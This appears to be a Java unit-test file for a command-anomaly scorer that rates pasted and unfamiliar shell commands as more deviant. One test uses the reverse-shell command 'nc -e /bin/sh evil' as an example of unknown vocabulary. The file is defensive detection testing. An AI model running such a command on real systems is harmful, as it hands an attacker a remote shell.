package com.intentguard.scoring;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.jupiter.api.Test;

import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.ComponentId;
import com.intentguard.domain.ComponentResult;
import com.intentguard.domain.InputOrigin;

/** Unit tests for {@link BehavioralDeviationComponent}, focused on the pasted-origin behavior. */
class BehavioralDeviationComponentTest {

    private static double deviation(BehavioralDeviationComponent component, CommandEvent event) {
        return component.score(ScoringTestSupport.context(event)).score().getAsDouble();
    }

    @Test
    void idIsBehavioralDeviation() {
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.empty());
        assertThat(component.id()).isEqualTo(ComponentId.BEHAVIORAL_DEVIATION);
    }

    @Test
    void pastedEventDeviatesStrictlyMoreThanIdenticalTypedEvent() {
        // A well-known command (in vocabulary + a known successor) so vocab/sequence features are
        // identical for both events, isolating the typed-vs-pasted difference.
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .vocabulary(Map.of("git", 300))
                .sequenceStats(Map.of("ls>git status", 50))
                .typedPastedRatioByCategory(Map.of("vcs", 0.9))
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));

        CommandEvent typed = ScoringTestSupport.event("git status", "/home/alice/proj", "proj", InputOrigin.TYPED);
        CommandEvent pasted = ScoringTestSupport.event("git status", "/home/alice/proj", "proj", InputOrigin.PASTED);

        assertThat(deviation(component, pasted)).isGreaterThan(deviation(component, typed));
    }

    @Test
    void lowTypedPastedRatioAmplifiesThePastedIncreaseMore() {
        // Two categories, same command structure, differing only in the profile's typed-vs-pasted
        // ratio. The pasted increase (vs typed) must be at least as large in the lower-ratio category.
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .vocabulary(Map.of("git", 300, "curl", 300))
                .typedPastedRatioByCategory(Map.of(
                        "vcs", 0.95,       // high ratio -> mostly typed historically
                        "network", 0.30))  // low ratio -> smaller pasted increase expected? No: larger
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));

        double vcsTyped = deviation(component,
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.TYPED));
        double vcsPasted = deviation(component,
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.PASTED));
        double netTyped = deviation(component,
                ScoringTestSupport.event("curl https://x", "/home/alice", null, InputOrigin.TYPED));
        double netPasted = deviation(component,
                ScoringTestSupport.event("curl https://x", "/home/alice", null, InputOrigin.PASTED));

        double vcsIncrease = vcsPasted - vcsTyped;
        double netIncrease = netPasted - netTyped;

        // network has the lower ratio (0.30 < 0.95), so its pasted increase must be at least as large.
        assertThat(netIncrease).isGreaterThanOrEqualTo(vcsIncrease);
        assertThat(netIncrease).isGreaterThan(0.0);
    }

    @Test
    void unknownOriginDeviatesBetweenTypedAndPasted() {
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .vocabulary(Map.of("git", 300))
                .typedPastedRatioByCategory(Map.of("vcs", 0.9))
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));

        double typed = deviation(component,
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.TYPED));
        double unknown = deviation(component,
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.UNKNOWN));
        double pasted = deviation(component,
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.PASTED));

        assertThat(unknown).isGreaterThan(typed);
        assertThat(unknown).isLessThan(pasted);
    }

    @Test
    void unknownVocabularyRaisesDeviation() {
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .vocabulary(Map.of("git", 300))
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));

        double known = deviation(component,
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.TYPED));
        double unknown = deviation(component,
                ScoringTestSupport.event("nc -e /bin/sh evil", "/home/alice", null, InputOrigin.TYPED));

        assertThat(unknown).isGreaterThan(known);
    }

    @Test
    void scoreIsAlwaysInUnitIntervalAcrossVariedInputs() {
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .vocabulary(Map.of("git", 10))
                .typedPastedRatioByCategory(Map.of("vcs", 0.0, "network", 1.0))
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));

        InputOrigin[] origins = {InputOrigin.TYPED, InputOrigin.PASTED, InputOrigin.UNKNOWN};
        String[] commands = {"git status", "curl https://x", "unknownbin --x", ""};
        for (String cmd : commands) {
            for (InputOrigin origin : origins) {
                double score = deviation(component,
                        ScoringTestSupport.event(cmd, "/home/alice", null, origin));
                assertThat(score).as("score for '%s' / %s", cmd, origin).isBetween(0.0, 1.0);
            }
        }
    }

    @Test
    void pastedWithZeroRatioCategoryClampsWithinUnitInterval() {
        // ratio 0.0 -> maximum pasted feature (PASTED_BASE + span = 1.0); deviation must stay <= 1.0.
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .typedPastedRatioByCategory(Map.of("network", 0.0))
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));

        double score = deviation(component,
                ScoringTestSupport.event("curl https://x", "/home/alice", null, InputOrigin.PASTED));
        assertThat(score).isBetween(0.0, 1.0);
    }

    @Test
    void isDeterministic() {
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .vocabulary(Map.of("git", 300))
                .typedPastedRatioByCategory(Map.of("vcs", 0.5))
                .build();
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));
        CommandEvent event = ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.PASTED);

        assertThat(deviation(component, event)).isEqualTo(deviation(component, event));
    }

    @Test
    void pastedEventCarriesPastedNote() {
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.empty());
        ComponentResult result = component.score(ScoringTestSupport.context(
                ScoringTestSupport.event("git status", "/home/alice", null, InputOrigin.PASTED)));
        assertThat(result.note()).contains("pasted");
    }

    @Test
    void appliesConfiguredWeight() {
        BehavioralDeviationComponent component = new BehavioralDeviationComponent(ProfileSnapshotProvider.empty());
        ComponentResult result = component.score(ScoringTestSupport.context(ScoringTestSupport.typed("git status")));
        assertThat(result.weight()).isEqualTo(0.25);
    }
}
